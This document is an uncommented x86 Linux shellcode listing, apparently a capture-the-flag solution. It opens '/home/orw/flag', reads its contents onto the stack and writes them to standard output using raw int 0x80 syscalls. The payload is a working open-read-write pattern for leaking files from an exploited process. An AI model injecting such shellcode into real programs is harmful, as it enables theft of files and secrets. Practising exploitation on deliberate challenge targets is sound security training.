# Open
xor eax, eax
mov al, 0x05
push ecx
sub esp, 40
push 0x00006761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx, esp
xor ecx, ecx
int 0x80

# Read
xchg eax, ebx
xchg eax, ecx
mov al, 0x03
mov dx, 60
inc edx
int 0x80

# Write
xchg eax, edx
mov bl, 0x01
mov ecx, esp
mov al, 0x04
int 0x80

xor eax, eax
inc eax
int 0x80